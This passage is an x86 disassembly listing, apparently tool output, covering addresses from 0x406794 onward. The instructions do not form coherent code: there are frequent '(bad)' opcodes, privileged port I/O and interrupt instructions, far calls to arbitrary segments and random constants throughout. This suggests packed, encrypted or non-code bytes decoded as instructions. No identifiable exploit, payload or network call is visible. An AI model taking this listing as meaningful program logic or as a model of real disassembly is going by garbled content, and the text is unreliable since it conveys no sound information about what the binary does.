  406794:	jnp    0x406790
  406796:	hlt    
  406797:	call   0x2ad117d9
  40679c:	fild   WORD PTR [ebp-0x1c]
  40679f:	jl     0x406783
  4067a1:	fadd   DWORD PTR [ecx]
  4067a3:	aas    
  4067a4:	mov    ebp,0x867d7bce
  4067a9:	pslld  mm5,QWORD PTR [ebx+edi*2-0x57]
  4067ae:	cmp    DWORD PTR [edi+0x8],0xffffffef
  4067b2:	mov    al,ds:0xed361e2b
  4067b7:	adc    BYTE PTR [ecx],ah
  4067b9:	fcmovu st,st(6)
  4067bb:	push   esi
  4067bc:	rcl    DWORD PTR [esi+0x6667ad01],0x43
  4067c3:	leave  
  4067c4:	dec    edx
  4067c5:	je     0x4067b4
  4067c7:	xor    eax,0x37ce68e4
  4067cc:	mov    ah,BYTE PTR [esi+0x23]
  4067cf:	dec    edx
  4067d0:	in     al,dx
  4067d1:	stc    
  4067d2:	or     dl,BYTE PTR [ebx+0x644487ee]
  4067d8:	pop    ebx
  4067d9:	je     0x4067a6
  4067db:	or     esp,ebp
  4067dd:	cmp    eax,0x9f760710
  4067e2:	sub    esi,DWORD PTR [ecx+eax*8+0x4055f60a]
  4067e9:	shl    BYTE PTR [ebx-0x5422ebf3],1
  4067ef:	lods   al,BYTE PTR ds:[esi]
  4067f0:	js     0x406784
  4067f2:	ror    DWORD PTR [ecx],0x60
  4067f5:	mov    eax,0x21ac078f
  4067fa:	shl    bl,0x0
  4067fd:	xor    eax,0x286ce275
  406802:	dec    esi
  406803:	dec    eax
  406804:	call   0xb33c0932
  406809:	mov    bl,0x1b
  40680b:	mov    ds:0xfcbbc7bb,eax
  406810:	xor    BYTE PTR [edi+ebx*8],dh
  406813:	jmp    0x4067ce
  406815:	mov    DWORD PTR [ebx-0x28520a0c],esi
  40681b:	pusha  
  40681c:	lods   al,BYTE PTR ds:[esi]
  40681d:	cwde   
  40681e:	or     al,0xbb
  406820:	xchg   WORD PTR [ebx-0x2984cc7c],ax
  406827:	mov    al,0xb2
  406829:	sbb    edi,DWORD PTR [eax-0x577ca546]
  40682f:	cmp    DWORD PTR [edx],ebp
  406831:	test   eax,0x7375dff2
  406836:	mov    ebp,0x94c535ab
  40683b:	fwait
  40683c:	add    al,0x47
  40683e:	clc    
  40683f:	rcr    DWORD PTR [edx-0x5838181c],cl
  406845:	or     ch,cl
  406847:	or     eax,0xe09d0a4
  40684c:	popa   
  40684d:	inc    esp
  40684e:	sbb    eax,0x27f99563
  406853:	cmp    eax,0x9d4cbcbb
  406858:	(bad)  
  406859:	cdq    
  40685a:	ins    BYTE PTR es:[edi],dx
  40685b:	jmp    0x40689a
  40685d:	push   es
  40685e:	adc    al,dh
  406860:	push   0xffffffab
  406862:	test   al,0x7
  406864:	out    0x92,al
  406866:	stos   BYTE PTR es:[edi],al
  406867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406868:	cli    
  406869:	iret   
  40686a:	sbb    eax,0xa12f61f2
  40686f:	or     edx,DWORD PTR [eax+0x32]
  406872:	xchg   ecx,eax
  406873:	sti    
  406874:	add    eax,0x72b716a8
  406879:	or     al,0xb
  40687b:	test   eax,0x7047ff79
  406880:	popf   
  406881:	das    
  406882:	xchg   ebx,eax
  406883:	out    dx,eax
  406884:	hlt    
  406885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406886:	jl     0x40683e
  406888:	jl     0x406812
  40688a:	scas   al,BYTE PTR es:[edi]
  40688b:	pop    esp
  40688c:	jg     0x406858
  40688e:	das    
  40688f:	fdiv   QWORD PTR [ebx-0x32]
  406892:	loop   0x4068c7
  406894:	out    dx,al
  406895:	add    eax,0x944cd4dd
  40689a:	and    dh,0xc
  40689d:	enter  0x2f4b,0xa6
  4068a1:	push   ebp
  4068a2:	pop    edx
  4068a3:	pop    ds
  4068a4:	(bad)  
  4068a5:	call   0x758e:0x64360be8
  4068ac:	jmp    0x420:0x51c55365
  4068b3:	ret    0xf22d
  4068b6:	inc    esi
  4068b7:	add    BYTE PTR ds:0x97ac2f79,ah
  4068bd:	push   ecx
  4068be:	sub    eax,0x72642d64
  4068c3:	mov    esp,0x72cc40ad
  4068c8:	les    eax,FWORD PTR [eax]
  4068ca:	xchg   edi,eax
  4068cb:	or     BYTE PTR [ecx+0x7021b8e7],dh
  4068d1:	xchg   edi,eax
  4068d2:	lds    ecx,FWORD PTR [eax]
  4068d4:	ins    BYTE PTR es:[edi],dx
  4068d5:	dec    ecx
  4068d6:	adc    dl,ah
  4068d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068d9:	fdivr  DWORD PTR [edx-0x48cbeef1]
  4068df:	dec    ecx
  4068e0:	mov    edi,0x21a7e4c4
  4068e5:	xchg   edx,eax
  4068e6:	arpl   bx,sp
  4068e8:	and    al,0x97
  4068ea:	and    eax,0xa1fba9d3
  4068ef:	(bad)  
  4068f0:	int3   
  4068f1:	cmp    edi,DWORD PTR [edi+ebp*1]
  4068f4:	fdivr  DWORD PTR [eax]
  4068f6:	pushf  
  4068f7:	pushf  
  4068f8:	fdiv   st,st(6)
  4068fa:	hlt    
  4068fb:	(bad)  
  4068fc:	dec    esp
  4068fd:	inc    edx
  4068fe:	clc    
  4068ff:	mov    DWORD PTR [eax],ecx
  406901:	add    DWORD PTR [ebp+0x33],esi
  406904:	out    dx,eax
  406905:	shr    BYTE PTR [esi+edi*4-0x62],0x37
  40690a:	repz push edi
  40690c:	ret    0x2251
  40690f:	mov    al,ds:0xf6f84080
  406914:	dec    ebx
  406915:	ja     0x4068de
  406917:	push   cs
  406918:	call   0xc92f:0x9edde667
  40691f:	ret    0x3d51
  406922:	jmp    0x4068ff
  406924:	xor    BYTE PTR [ecx+0x53],cl
  406927:	arpl   WORD PTR [esi],bp
  406929:	mov    ds:0xb8b05aa8,eax
  40692e:	mov    eax,0x972b17f4
  406933:	mov    ecx,0x52015745
  406938:	in     al,0x55
  40693a:	add    ecx,DWORD PTR [esp+ecx*8+0xed076cf]
  406941:	inc    ebx
  406942:	pop    edi
  406943:	mov    DWORD PTR [ebx+0x12dd1c95],ebp
  406949:	push   es
  40694a:	or     BYTE PTR [esi+ebx*2-0x78],dl
  40694e:	inc    eax
  40694f:	cmp    BYTE PTR [eax],ah
  406951:	icebp  
  406952:	cmp    eax,eax
  406954:	scas   al,BYTE PTR es:[edi]
  406955:	push   0x6f
  406957:	sub    ecx,DWORD PTR [ebp-0x52]
  40695a:	mov    al,0x32
  40695c:	pop    esi
  40695d:	inc    ecx
  40695e:	cs add al,0xd7
  406961:	clc    
  406962:	and    al,0x82
  406964:	test   BYTE PTR [esi],al
  406966:	mov    esi,0xa32a694b
  40696b:	lods   al,BYTE PTR ds:[esi]
  40696c:	jmp    0x5a46:0xa7f46d7d
  406973:	jmp    0x4aea:0xf0d86c0e
  40697a:	xchg   edx,eax
  40697b:	mov    DWORD PTR [esp+eax*4-0x70],ebp
  40697f:	pop    ds
  406980:	adc    eax,0xb10e8ccb
  406985:	lock pop ds
  406987:	mov    bh,0x8
  406989:	push   es
  40698a:	mov    ah,cl
  40698c:	mov    al,ds:0xa5c01bd7
  406991:	in     eax,0xb3
  406993:	push   0xa2e65b5f
  406998:	mov    ebp,0xf79dcb7d
  40699d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40699e:	mul    BYTE PTR [ebx+0x245a4913]
  4069a4:	cmp    DWORD PTR [ecx+0x7aa9a595],edx
  4069aa:	popa   
  4069ab:	push   edx
  4069ac:	fldcw  WORD PTR [edi-0x21747d72]
  4069b2:	and    al,0x7f
  4069b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069b5:	add    dl,cl
  4069b7:	in     eax,0x14
  4069b9:	mov    eax,ds:0x32c16824
  4069be:	ins    DWORD PTR es:[edi],dx
  4069bf:	popf   
  4069c0:	icebp  
  4069c1:	pushf  
  4069c2:	cmp    BYTE PTR [edx],0xbb
  4069c5:	mov    BYTE PTR [edx],dl
  4069c7:	out    dx,eax
  4069c8:	ins    DWORD PTR es:[edi],dx
  4069c9:	hlt    
  4069ca:	repnz mov DWORD PTR [ebp-0x4],esp
  4069ce:	ins    DWORD PTR es:[edi],dx
  4069cf:	scas   al,BYTE PTR es:[edi]
  4069d0:	aad    0x8e
  4069d2:	xlat   BYTE PTR ds:[ebx]
  4069d3:	push   es
  4069d4:	adc    DWORD PTR [edx+0x19],ebx
  4069d7:	cdq    
  4069d8:	mov    ebx,0x821dbe4f
  4069dd:	mov    esi,0x8727063e
  4069e2:	inc    ebp
  4069e3:	es push esi
  4069e5:	and    al,0x4
  4069e7:	daa    
  4069e8:	adc    DWORD PTR [eax+edx*8+0x53],edi
  4069ec:	shl    BYTE PTR [edi-0x44a4a0a],1
  4069f2:	xchg   ebx,eax
  4069f3:	push   ebx
  4069f4:	bndldx (bad),[ebx+0x78]
  4069f8:	fld    DWORD PTR [ecx+0x18]
  4069fb:	xchg   ecx,eax
  4069fc:	cld    
  4069fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069fe:	and    esp,DWORD PTR [esi]
  406a00:	mov    ebp,0x60450b48
  406a05:	aaa    
  406a06:	push   ss
  406a07:	fcomp  DWORD PTR [esi+0x4c]
  406a0a:	int    0xa5
  406a0c:	retf   0x3f14
  406a0f:	retf   0x3fa1
  406a12:	jp     0x406a04
  406a14:	xchg   ebp,eax
  406a15:	and    dl,BYTE PTR [ebx+0x7b]
  406a18:	stos   BYTE PTR es:[edi],al
  406a19:	loopne 0x406a2e
  406a1b:	in     eax,0x9a
  406a1d:	hlt    
  406a1e:	pop    esi
  406a1f:	mov    esi,DWORD PTR [esi+0xceabc11]
  406a25:	adc    ebp,ebp
  406a27:	adc    ch,dh
  406a29:	cs sub eax,0xf9cc3802
  406a2f:	xchg   DWORD PTR [edx+0x6a],esp
  406a32:	test   DWORD PTR [edx],ecx
  406a34:	or     al,0x63
  406a36:	jno    0x406a4a
  406a38:	jg     0x406aac
  406a3a:	mov    dh,0xb5
  406a3c:	cmc    
  406a3d:	push   cs
  406a3e:	sbb    al,dh
  406a40:	adc    al,0x79
  406a42:	lea    esi,[ebx-0x74]
  406a45:	call   0x50764856
  406a4a:	pop    ebx
  406a4b:	lock mov bh,0x28
  406a4e:	xchg   DWORD PTR [edi-0x29],esp
  406a51:	xchg   dh,ch
  406a53:	xchg   DWORD PTR [esi-0x7accce0c],ecx
  406a59:	loopne 0x406a84
  406a5b:	sub    al,BYTE PTR [eax]
  406a5d:	in     eax,dx
  406a5e:	cmp    al,0xbf
  406a60:	out    0x71,eax
  406a62:	lods   eax,DWORD PTR ds:[esi]
  406a63:	push   ss
  406a64:	adc    eax,0x6ddf83b2
  406a69:	mov    ds:0x80f45030,eax
  406a6e:	scas   al,BYTE PTR es:[edi]
  406a6f:	add    cl,BYTE PTR [eax+0x69]
  406a72:	es lahf 
  406a74:	and    bh,BYTE PTR [ecx+0x13]
  406a77:	and    eax,DWORD PTR [edx]
  406a79:	int    0x64
  406a7b:	ficom  WORD PTR [ebx+0x70]
  406a7e:	xor    DWORD PTR [edi-0x5c2d1395],esi
  406a84:	into   
  406a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a86:	mov    al,0x6d
  406a88:	push   cs
  406a89:	dec    edi
  406a8a:	push   ebp
  406a8b:	mov    ds:0x11d050ea,eax
  406a90:	in     eax,0x64
  406a92:	loopne 0x406a33
  406a94:	xlat   BYTE PTR ds:[ebx]
  406a95:	mov    eax,0xb63de44f
  406a9a:	rol    DWORD PTR [esi+0x47cb7078],0xe9
  406aa1:	leave  
  406aa2:	jnp    0x406a48
  406aa4:	sbb    ch,BYTE PTR [ecx+eiz*4+0x7b0663ab]
  406aab:	(bad)  
  406aad:	mov    ebp,0xb7bfddea
  406ab2:	sbb    cl,ch
  406ab4:	pusha  
  406ab5:	stos   BYTE PTR es:[edi],al
  406ab6:	in     eax,dx
  406ab7:	fidivr WORD PTR ds:0x2fb58db7
  406abd:	test   DWORD PTR [edx],0x58645cff
  406ac3:	pop    ebx
  406ac4:	push   ss
  406ac5:	iret   
  406ac6:	sub    cl,BYTE PTR [ecx+0x72421e43]
  406acc:	in     al,dx
  406acd:	mov    ebx,DWORD PTR [esi+0xb]
  406ad0:	dec    ebx
  406ad1:	mov    dh,0x61
  406ad3:	add    BYTE PTR [ebx+0x46b47276],cl
  406ad9:	mov    ebx,0x46a0db39
  406ade:	xchg   BYTE PTR [edi],bl
  406ae0:	rol    BYTE PTR [edx+0x7c],1
  406ae3:	mov    bh,0x80
  406ae5:	xchg   ebp,eax
  406ae6:	loopne 0x406a91
  406ae8:	mov    eax,ds:0xa4dbff16
  406aed:	mov    eax,ds:0x92abcc19
  406af2:	sar    edx,1
  406af4:	xor    al,0x38
  406af6:	jg     0x406b64
  406af8:	fs test al,0xd1
  406afb:	ins    BYTE PTR es:[edi],dx
  406afc:	cmp    ah,bl
  406afe:	inc    edx
  406aff:	cmp    DWORD PTR [ecx-0x3eb19d15],esi
  406b05:	(bad)
  406b08:	push   esi
  406b09:	ss test eax,0x16391a33
  406b0f:	std    
  406b10:	mov    eax,ds:0xd1152f6b
  406b15:	rol    BYTE PTR [ebx-0x3a],1
  406b18:	push   esi
  406b19:	and    bl,BYTE PTR [edx+0x14]
  406b1c:	cli    
  406b1d:	inc    ebx
  406b1e:	adc    edi,ebp
  406b20:	inc    edx
  406b21:	lods   eax,DWORD PTR ds:[esi]
  406b22:	ins    BYTE PTR es:[edi],dx
  406b23:	hlt    
  406b24:	cmp    edi,DWORD PTR [eax+0x24]
  406b27:	pushf  
  406b28:	adc    BYTE PTR [ebp+0x3a],dh
  406b2b:	mov    edx,0x3ec3f7ab
  406b30:	mov    dl,0x2c
  406b32:	mov    al,0x52
  406b34:	push   ss
  406b35:	daa    
  406b36:	inc    eax
  406b37:	inc    edx
  406b38:	mov    DWORD PTR [eax],ebx
  406b3a:	pop    ebx
  406b3b:	jle    0x406b56
  406b3d:	or     BYTE PTR [ebp-0x38],ah
  406b40:	call   0xea27:0x83bfb633
  406b47:	lea    esi,[ebx+0x3cae0]
  406b4d:	pop    ss
  406b4e:	iret   
  406b4f:	push   0x17
  406b51:	cld    
  406b52:	fmul   DWORD PTR [eax+0x59]
  406b55:	pop    ebp
  406b56:	ror    DWORD PTR [edx-0x7ec3c16b],1
  406b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b5d:	(bad)  
  406b5e:	sub    ax,0x520a
  406b62:	and    eax,0xc4b31c39
  406b67:	sub    BYTE PTR [ebx+0x54],cl
  406b6a:	rcl    BYTE PTR [edi],0xea
  406b6d:	sahf   
  406b6e:	(bad)  [ebx-0x66da7af8]
  406b74:	js     0x406b41
  406b76:	mov    eax,0x13eef9b0
  406b7b:	xor    eax,0xf9f067b3
  406b80:	fstp   TBYTE PTR [ebx-0x3b700879]
  406b86:	sub    eax,0xd37e2ce8
  406b8b:	jl     0x406bc9
  406b8d:	and    BYTE PTR [ecx],ch
  406b8f:	mov    dh,0xeb
  406b91:	or     ebx,0xd44a83f2
  406b97:	lds    ebx,FWORD PTR [esi]
  406b99:	push   esp
  406b9a:	xor    cl,ah
  406b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b9d:	imul   edi,ecx,0xdb3399dd
  406ba3:	loop   0x406b77
  406ba5:	mov    ch,0x83
  406ba7:	sahf   
  406ba8:	fist   DWORD PTR [edi-0x5fae6d13]
  406bae:	and    DWORD PTR [ecx+0x72e65c4a],edi
  406bb4:	xchg   ebp,eax
  406bb5:	mov    cl,0xb1
  406bb7:	xor    dl,BYTE PTR [edx-0x1c]
  406bba:	xchg   ebx,eax
  406bbb:	push   DWORD PTR [ebx+edx*2+0x645ebb2]
  406bc2:	fwait
  406bc3:	sub    dl,ch
  406bc5:	mov    cl,0x9e
  406bc7:	or     BYTE PTR [ecx+0x7f55f15c],al
  406bcd:	enter  0x8858,0x9b
  406bd1:	jmp    0x406baa
  406bd3:	iret   
  406bd4:	cmp    al,0xa1
  406bd6:	popa   
  406bd7:	cwde   
  406bd8:	mov    dh,0xe1
  406bda:	add    bl,BYTE PTR [edx+0x15]
  406bdd:	sub    eax,0x4e5c825b
  406be2:	sbb    DWORD PTR [esi-0x33],edi
  406be5:	xchg   ebp,eax
  406be6:	pop    esi
  406be7:	sbb    BYTE PTR [edi-0x1d],bl
  406bea:	xor    bl,BYTE PTR [edi]
  406bec:	jmp    0x406b73
  406bee:	dec    esi
  406bef:	call   0x3855:0xb581d674
  406bf6:	push   es
  406bf7:	dec    ebp
  406bf8:	nop
  406bf9:	push   esp
  406bfa:	inc    ecx
  406bfb:	or     ah,BYTE PTR [esi*2-0x3fcc10b2]
  406c02:	in     al,0x21
  406c04:	(bad)
  406c07:	jmp    0x406bc0
  406c09:	jno    0x406c1c
  406c0b:	mov    al,0x3a
  406c0d:	leave  
  406c0e:	xchg   ecx,eax
  406c0f:	mov    ah,0xa8
  406c11:	pop    esi
  406c12:	retf   0x6779
  406c15:	outs   dx,BYTE PTR ds:[esi]
  406c16:	sub    eax,0x4c2924f7
  406c1b:	bound  esp,QWORD PTR [ebx-0x68]
  406c1e:	out    dx,eax
  406c1f:	out    0x80,eax
  406c21:	xor    al,0x78
  406c23:	lock cmc 
  406c25:	std    
  406c26:	xor    dh,BYTE PTR [edi+0x2f1f4127]
  406c2c:	xor    al,bh
  406c2e:	jb     0x406bd3
  406c30:	pop    edi
  406c31:	lods   eax,DWORD PTR ds:[esi]
  406c32:	mov    al,ds:0x5bb016bb
  406c37:	in     eax,0xec
  406c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c3a:	outs   dx,DWORD PTR ds:[esi]
  406c3b:	and    BYTE PTR [ecx+0xc],al
  406c3e:	jle    0x406be2
  406c40:	mov    DWORD PTR ds:0xaab4e227,ebp
  406c46:	arpl   WORD PTR [eax],dx
  406c48:	inc    ebx
  406c49:	stc    
  406c4a:	xchg   edx,eax
  406c4b:	sub    eax,esi
  406c4d:	fisubr DWORD PTR [edi+0x555d369c]
  406c53:	inc    ebx
  406c54:	aaa    
  406c55:	ret    0x43e3
  406c58:	sub    DWORD PTR [ecx+0xf18ab29],ebx
  406c5e:	dec    eax
  406c5f:	xchg   BYTE PTR [esi+0x35d5c0a7],cl
  406c65:	adc    al,0xc9
  406c67:	cli    
  406c68:	dec    edi
  406c69:	and    edi,DWORD PTR [edx]
  406c6b:	repz cwde 
  406c6d:	stos   DWORD PTR es:[edi],eax
  406c6e:	xor    cl,BYTE PTR [edx]
  406c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c71:	sar    DWORD PTR [esi-0x59d06024],1
  406c77:	mov    ah,0xbb
  406c79:	pop    ecx
  406c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c7b:	test   eax,0x82dd1ad0
  406c80:	cmp    al,0x58
  406c82:	mov    al,0x97
  406c84:	xor    al,0xa1
  406c86:	or     al,0xcc
  406c88:	inc    ebx
  406c89:	mov    ch,0xa0
  406c8b:	lea    esi,[ebx-0x6685fd0]
  406c91:	or     BYTE PTR [ebp-0x5b],bh
  406c94:	mov    esp,0xf098b23
  406c99:	mov    eax,0xb1fd3e02
  406c9e:	dec    ebx
  406c9f:	sub    BYTE PTR [ebx+0x14cf77b2],0x8e
  406ca6:	clc    
  406ca7:	ror    DWORD PTR [ebx-0x2649822],0x17
  406cae:	inc    ebp
  406caf:	sub    eax,0x33cc54ba
  406cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cb5:	or     eax,0xc2be65f3
  406cba:	push   es
  406cbb:	sahf   
  406cbc:	fstp   DWORD PTR [esi]
  406cbe:	inc    esi
  406cbf:	sbb    DWORD PTR [esi+0x4],esi
  406cc2:	jne    0x406ceb
  406cc4:	in     eax,dx
  406cc5:	mov    eax,0x8fda1e80
  406cca:	in     al,0x9e
  406ccc:	pop    ebx
  406ccd:	mov    eax,ds:0xe25a93a5
  406cd2:	push   ss
  406cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd4:	pop    ss
  406cd5:	je     0x406c94
  406cd7:	jns    0x406ce8
  406cd9:	or     BYTE PTR [ebx-0x1f432da4],0xe3
  406ce0:	ss push 0xffffffd2
  406ce3:	sub    DWORD PTR [ecx+0x14454dc1],ebx
  406ce9:	add    BYTE PTR [edi],dl
  406ceb:	dec    ecx
  406cec:	in     al,0x6
  406cee:	or     DWORD PTR [esi+0x71],ebx
  406cf1:	dec    esi
  406cf2:	loope  0x406d36
  406cf4:	xor    eax,0x4c2a1c16
  406cf9:	stc    
  406cfa:	adc    al,0x55
  406cfc:	std    
  406cfd:	ins    BYTE PTR es:[edi],dx
  406cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cff:	sbb    DWORD PTR [edi],esi
  406d01:	adc    edx,esp
  406d03:	push   ebx
  406d04:	fisttp DWORD PTR ds:0xab58e5ae
  406d0b:	mov    edx,0x937b9c19
  406d10:	fbstp  TBYTE PTR [eax+0x79]
  406d13:	addr16 mov ah,0xc6
  406d16:	push   ecx
  406d17:	(bad)  
  406d18:	lock rol BYTE PTR [esi+0x389d4fbf],cl
  406d1f:	jns    0x406d44
  406d21:	dec    ebx
  406d22:	push   es
  406d23:	add    DWORD PTR [ebp+ebx*1-0x1b],ecx
  406d27:	fsub   st(4),st
  406d29:	shl    BYTE PTR [edx-0x19],cl
  406d2c:	jecxz  0x406cf4
  406d2e:	cmp    ch,BYTE PTR [ecx-0x6902ef06]
  406d34:	fwait
  406d35:	cwde   
  406d36:	(bad)  
  406d37:	sahf   
  406d38:	inc    esp
  406d39:	adc    eax,0x6f15c49b
  406d3e:	pop    edi
  406d3f:	dec    eax
  406d40:	xor    DWORD PTR [edi-0x2cf6c352],edi
  406d46:	das    
  406d47:	loop   0x406d7d
  406d49:	fisttp WORD PTR [edi+ebp*1-0x56]
  406d4d:	shl    DWORD PTR [edx],0x14
  406d50:	and    BYTE PTR [ecx+0x51],bl
  406d53:	pop    esi
  406d54:	imul   edx,DWORD PTR [edx-0x5663bb55],0xffffffb6
  406d5b:	fisubr DWORD PTR [edi-0x3c996429]
  406d61:	lea    edi,[edi]
  406d63:	retf   0xb98
  406d66:	lds    ebx,FWORD PTR [edx+0x11]
  406d69:	sub    edx,esi
  406d6b:	jecxz  0x406da9
  406d6d:	jle    0x406d4b
  406d6f:	xor    esp,ecx
  406d71:	scas   eax,DWORD PTR es:[edi]
  406d72:	sbb    al,0x3a
  406d74:	test   eax,0xf996cbed
  406d79:	jnp    0x406d94
  406d7b:	push   ebx
  406d7c:	jne    0x406d49
  406d7e:	sbb    eax,0xbb3fe475
  406d83:	mov    BYTE PTR [si-0x530b],al
  406d88:	cmp    al,0x99
  406d8a:	pusha  
  406d8b:	cmp    edx,DWORD PTR [edi-0xf]
  406d8e:	pushf  
  406d8f:	daa    
  406d90:	pop    esp
  406d91:	or     al,0x27
  406d93:	in     eax,0xc
  406d95:	(bad)  
  406d96:	cli    
  406d97:	lock add DWORD PTR [ecx+0x7c6d4376],0x77
  406d9f:	out    0x13,eax
  406da1:	fisttp WORD PTR [ebp+ecx*8+0x56b98a12]
  406da8:	push   ebp
  406da9:	mov    ds:0x53ca3786,eax
  406dae:	in     al,0xe8
  406db0:	xchg   edi,eax
  406db1:	xor    bl,BYTE PTR [edi]
  406db3:	stc    
  406db4:	rol    BYTE PTR [ebp+eax*8-0xbdbda72],cl
  406dbb:	cmp    BYTE PTR [ecx],al
  406dbd:	aaa    
  406dbe:	pop    es
  406dbf:	xor    edx,DWORD PTR [eax+0xf]
  406dc2:	sbb    DWORD PTR [edx],ebx
  406dc4:	call   0xf972:0x262fa584
  406dcb:	rol    DWORD PTR [edx+0x333ec517],0x72
  406dd2:	pop    ss
  406dd3:	test   eax,0x89c695ba
  406dd8:	inc    edx
  406dd9:	fistp  DWORD PTR [ebx+0x78]
  406ddc:	cmp    al,0x98
  406dde:	aad    0x4b
  406de0:	retf   0x72ef
  406de3:	call   0xcc1471c0
  406de8:	pop    ecx
  406de9:	out    dx,eax
  406dea:	push   esp
  406deb:	mov    WORD PTR gs:[edi],ds
  406dee:	or     al,0xfd
  406df0:	mov    al,0x1
  406df2:	add    dl,BYTE PTR [ebx+edi*1+0x65]
  406df6:	mov    ebx,0xd0fac1c
  406dfb:	pop    ds
  406dfc:	out    0x8a,al
  406dfe:	bound  ebx,QWORD PTR [ecx+0x40da5e7]
  406e04:	jle    0x406de8
  406e06:	jp     0x406e14
  406e08:	push   edx
  406e09:	push   es
  406e0a:	xlat   BYTE PTR ds:[ebx]
  406e0b:	and    dl,BYTE PTR [esi*8-0x2339aabd]
  406e12:	mov    edx,0x56777466
  406e17:	sub    esp,DWORD PTR [ecx]
  406e19:	loop   0x406e0e
  406e1b:	jb     0x406e04
  406e1d:	enter  0xf611,0x9c
  406e21:	pop    edi
  406e22:	call   0x57bf:0x6dfca2cb
  406e29:	fsubr  DWORD PTR [esi-0x3ca9e0cc]
  406e2f:	loop   0x406e4d
  406e31:	shr    BYTE PTR [ebp+0x1899755c],cl
  406e37:	icebp  
  406e38:	mov    al,cl
  406e3a:	mov    DWORD PTR ds:0xefdbfda,esp
  406e40:	mov    ds:0xc710ec74,al
  406e45:	psllq  mm1,mm0
  406e48:	pop    ebx
  406e49:	cmp    ebp,DWORD PTR [ebp-0x242033c1]
  406e4f:	sbb    al,0x9e
  406e51:	cwde   
  406e52:	sub    eax,0x285d28ea
  406e57:	je     0x406ddd
  406e59:	rol    BYTE PTR [ecx-0x6f],0x66
  406e5d:	loop   0x406eda
  406e5f:	test   al,0x5b
  406e61:	pop    esi
  406e62:	out    dx,al
  406e63:	call   0xfe3a:0x9d2e53e5
  406e6a:	or     eax,DWORD PTR [ebp-0x5584f08b]
  406e70:	fiadd  DWORD PTR [esi+ebp*8]
  406e73:	das    
  406e74:	adc    BYTE PTR [esi-0x24246c26],dh
  406e7a:	inc    ebp
  406e7b:	or     eax,0x92c35176
  406e80:	fucomp st(5)
  406e82:	push   ecx
  406e83:	adc    ebp,DWORD PTR [ecx+0x238747e4]
  406e89:	rcl    BYTE PTR [edi+0x5b],cl
  406e8c:	sbb    DWORD PTR [edi+ebp*2],ebp
  406e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e90:	das    
  406e91:	inc    esp
  406e92:	push   0xffffffa3
  406e94:	jecxz  0x406e5e
  406e96:	jae    0x406eae
  406e98:	pop    eax
  406e99:	ins    BYTE PTR es:[edi],dx
  406e9a:	out    dx,al
  406e9b:	mov    DWORD PTR ss:[ecx+0x78],eax
  406e9f:	aad    0x21
  406ea1:	or     BYTE PTR [edi+0x10],ch
  406ea4:	pop    eax
  406ea5:	icebp  
  406ea6:	mov    bl,0x4
  406ea8:	popa   
  406ea9:	aad    0xa2
  406eab:	cli    
  406eac:	test   BYTE PTR [eax+0x21],bl
  406eaf:	jbe    0x406e63
  406eb1:	sub    al,0x46
  406eb3:	adc    al,0xb5
  406eb5:	(bad)  
  406eb6:	(bad)  
  406eb7:	inc    ecx
  406eb8:	stos   BYTE PTR es:[edi],al
  406eb9:	mov    BYTE PTR [ebx-0x56b228ec],ah
  406ebf:	mov    ds:0xb13deacf,eax
  406ec4:	sub    BYTE PTR [ecx+0x15],bh
  406ec7:	or     dl,dl
  406ec9:	xchg   edi,eax
  406eca:	mov    ebx,0x706d4ff5
  406ecf:	retf   
  406ed0:	pushf  
  406ed1:	aad    0x8f
  406ed3:	mov    ebp,0xffa4f667
  406ed8:	das    
  406ed9:	xor    BYTE PTR [edi],dh
  406edb:	fldcw  WORD PTR [edx+esi*1-0x70]
  406edf:	into   
  406ee0:	xchg   DWORD PTR [ebx-0x19],edi
  406ee3:	or     esi,DWORD PTR [eax+0x19]
  406ee6:	lods   eax,DWORD PTR ds:[esi]
  406ee7:	cmp    BYTE PTR [ebp-0x37],al
  406eea:	sub    eax,0xf7931365
  406eef:	es inc esi
  406ef1:	jns    0x406e7d
  406ef3:	int3   
  406ef4:	ins    WORD PTR es:[edi],dx
  406ef6:	stos   DWORD PTR es:[edi],eax
  406ef7:	cwde   
  406ef8:	sub    al,dl
  406efa:	add    BYTE PTR [esi-0xe],ch
  406efd:	xor    DWORD PTR ds:[edx],0x0
  406f01:	cwde   
  406f02:	push   eax
  406f03:	xchg   edi,eax
  406f04:	or     BYTE PTR cs:[esi-0x60],0x7b
  406f09:	push   es
  406f0a:	inc    eax
  406f0b:	add    BYTE PTR [bp+si+0x3da8],bh
  406f10:	jp     0x406f4f
  406f12:	mov    edi,DWORD PTR [eax-0x39ccc432]
  406f18:	aad    0x5e
  406f1a:	xor    ch,ch
  406f1c:	pop    ebp
  406f1d:	ins    DWORD PTR es:[edi],dx
  406f1e:	mov    ss,WORD PTR [edx]
  406f20:	mov    eax,ds:0xea0506f2
  406f25:	pop    edi
  406f26:	pop    ds
  406f27:	(bad)
  406f2a:	cwde   
  406f2b:	mov    bh,0x1d
  406f2d:	pop    edi
  406f2e:	outs   dx,BYTE PTR ds:[esi]
  406f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f30:	adc    eax,0x7ca7f082
  406f35:	sbb    ebp,esp
  406f37:	aas    
  406f38:	mov    dl,bh
  406f3a:	and    bh,BYTE PTR [ebp-0x54]
  406f3d:	pop    edi
  406f3e:	pop    esi
  406f3f:	jne    0x406ed6
  406f41:	(bad)  
  406f42:	mov    ss:0x40a9e96e,eax
  406f48:	push   ss
  406f49:	cli    
  406f4a:	pop    es
  406f4b:	mul    DWORD PTR [esi]
  406f4d:	push   ds
  406f4e:	sbb    bh,BYTE PTR [edx-0xc767ad4]
